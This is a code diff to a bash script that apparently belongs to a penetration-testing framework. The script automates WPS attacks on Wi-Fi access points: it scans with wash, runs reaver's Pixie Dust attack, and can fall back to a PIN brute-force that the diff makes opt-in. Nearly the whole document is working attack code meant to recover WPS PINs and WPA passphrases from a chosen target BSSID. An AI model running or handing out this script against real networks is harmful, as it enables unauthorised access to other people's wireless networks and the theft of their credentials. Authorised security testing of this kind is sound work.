@@ -62,60 +62,55 @@ TEL_PID=$!
 PIXIE_FILE="${EVIDENCE_DIR}/${TC_ID}_pixie.txt"
 PIN_FILE="${EVIDENCE_DIR}/${TC_ID}_pin_bruteforce.txt"
 
-run_wps_attack() {
-    local target_iface="$1" target_bssid="$2" target_chan="$3" out_file="$4"
-    local args="-i ${target_iface} -b ${target_bssid}"
-    [[ -n "$target_chan" ]] && args+=" -c ${target_chan}"
-    [[ -n "$WPS_DELAY" ]] && args+=" -d ${WPS_DELAY}"
-    # shellcheck disable=SC2086
-    timeout "$SCAN_TIME" reaver ${args} "$@" -vv >> "$out_file" 2>&1 || true
-}
+# WPS attack sequence:
+#   Phase 1: Pixie Dust (reaver -K 1) — exploits weak DH nonces in AP firmware.
+#            Fast (seconds to minutes). Most modern APs are patched, but many embedded
+#            devices still vulnerable. Check for "WPS PIN" in output = success.
+#   Phase 2: PIN brute-force fallback — only if Pixie Dust did not recover credentials
+#            AND WPS_ATTACK=2 (explicit operator opt-in). Slow (hours).
 
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    timeout 30 wash -i "$INTERFACE" 2>&1 | tee "$WASH_FILE" || true
+    timeout --foreground 30 wash -i "$INTERFACE" 2>&1 | tee "$WASH_FILE" || true
     if [[ -n "$BSSID" ]]; then
         echo "[*] Phase 1: Pixie Dust attack (reaver -K 1)..."
-        {
-            ARGS="-i $INTERFACE -b $BSSID"
-            [[ -n "$CHANNEL" ]] && ARGS+=" -c $CHANNEL"
-            [[ -n "$WPS_DELAY" ]] && ARGS+=" -d $WPS_DELAY"
-            # shellcheck disable=SC2086
-            timeout "$SCAN_TIME" reaver $ARGS -K 1 -vv 2>&1 | tee "$PIXIE_FILE" || true
-        }
+        ARGS="-i $INTERFACE -b $BSSID"
+        [[ -n "$CHANNEL" ]] && ARGS+=" -c $CHANNEL"
+        [[ -n "$WPS_DELAY" ]] && ARGS+=" -d $WPS_DELAY"
+        # shellcheck disable=SC2086
+        timeout --foreground "$SCAN_TIME" reaver $ARGS -K 1 -vv 2>&1 | tee "$PIXIE_FILE" || true
 
-        # Phase 2: PIN brute-force fallback if Pixie Dust did not recover credentials
+        # Phase 2: PIN brute-force — only if Pixie Dust failed AND operator opted in
         if ! grep -qiE "WPA PSK|WPS PIN" "$PIXIE_FILE" 2>/dev/null; then
-            echo "[*] Phase 2: Pixie Dust failed — falling back to PIN brute-force (slow)..."
-            ARGS="-i $INTERFACE -b $BSSID"
-            [[ -n "$CHANNEL" ]] && ARGS+=" -c $CHANNEL"
-            [[ -n "$WPS_DELAY" ]] && ARGS+=" -d $WPS_DELAY"
-            # shellcheck disable=SC2086
-            timeout "$SCAN_TIME" reaver $ARGS -vv 2>&1 | tee "$PIN_FILE" || true
+            if [[ "$WPS_ATTACK" == "2" ]]; then
+                echo "[*] Phase 2: PIN brute-force (WPS_ATTACK=2 — this will take hours)..."
+                # shellcheck disable=SC2086
+                timeout --foreground "$SCAN_TIME" reaver $ARGS -vv 2>&1 | tee "$PIN_FILE" || true
+            else
+                echo "[+] Pixie Dust found no result. PIN brute-force skipped (set WPS_ATTACK=2 to enable)."
+            fi
         fi
         cat "$PIXIE_FILE" "$PIN_FILE" 2>/dev/null > "$INFO_FILE" || true
     fi
 else
-    (
-        timeout 30 wash -i "$INTERFACE" > "$WASH_FILE" 2>&1 || true
-        if [[ -n "$BSSID" ]]; then
-            echo "[*] Phase 1: Pixie Dust attack..." >> "$INFO_FILE"
-            ARGS="-i $INTERFACE -b $BSSID"
-            [[ -n "$CHANNEL" ]] && ARGS+=" -c $CHANNEL"
-            [[ -n "$WPS_DELAY" ]] && ARGS+=" -d $WPS_DELAY"
-            # shellcheck disable=SC2086
-            timeout "$SCAN_TIME" reaver $ARGS -K 1 -vv > "$PIXIE_FILE" 2>&1 || true
+    timeout 30 wash -i "$INTERFACE" > "$WASH_FILE" 2>&1 || true
+    if [[ -n "$BSSID" ]]; then
+        echo "[*] Phase 1: Pixie Dust attack..." >> "$INFO_FILE"
+        ARGS="-i $INTERFACE -b $BSSID"
+        [[ -n "$CHANNEL" ]] && ARGS+=" -c $CHANNEL"
+        [[ -n "$WPS_DELAY" ]] && ARGS+=" -d $WPS_DELAY"
+        # shellcheck disable=SC2086
+        timeout "$SCAN_TIME" reaver $ARGS -K 1 -vv > "$PIXIE_FILE" 2>&1 || true
 
-            # Phase 2 fallback: PIN brute-force only if Pixie Dust yielded nothing
-            if ! grep -qiE "WPA PSK|WPS PIN" "$PIXIE_FILE" 2>/dev/null; then
-                echo "[*] Phase 2: PIN brute-force fallback..." >> "$INFO_FILE"
+        # Phase 2 fallback: PIN brute-force only if Pixie Dust yielded nothing AND WPS_ATTACK=2
+        if ! grep -qiE "WPA PSK|WPS PIN" "$PIXIE_FILE" 2>/dev/null; then
+            if [[ "$WPS_ATTACK" == "2" ]]; then
+                echo "[*] Phase 2: PIN brute-force (WPS_ATTACK=2)..." >> "$INFO_FILE"
                 # shellcheck disable=SC2086
                 timeout "$SCAN_TIME" reaver $ARGS -vv > "$PIN_FILE" 2>&1 || true
             fi
-            cat "$PIXIE_FILE" "$PIN_FILE" 2>/dev/null > "$INFO_FILE" || true
         fi
-    ) > /dev/null 2>&1 &
-    TOOL_PID=$!
-    wait $TOOL_PID || true
+        cat "$PIXIE_FILE" "$PIN_FILE" 2>/dev/null > "$INFO_FILE" || true
+    fi
 fi
 
 # 3. Cleanup and Final Signal
